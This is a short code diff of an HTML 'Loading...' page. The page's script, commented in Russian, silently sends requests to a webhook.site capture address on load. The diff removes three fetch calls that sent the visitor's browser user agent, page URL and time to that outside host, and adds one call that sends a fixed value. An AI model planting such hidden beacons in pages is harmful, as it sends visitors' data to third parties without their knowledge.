@@ -3,13 +3,7 @@
 <body>
     <script>
         // Отправляем User-Agent (информация о браузере)
-        fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334? ua=' + encodeURIComponent(navigator.userAgent));
-        
-        // Или отправляем текущий URL страницы
-        fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334?url=' + encodeURIComponent(window.location.href));
-        
-        // Или отправляем время
-        fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334?time=' + encodeURIComponent(new Date().toString()));
+        fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334?data=234242')
     </script>
     <p>Loading...</p>
 </body>
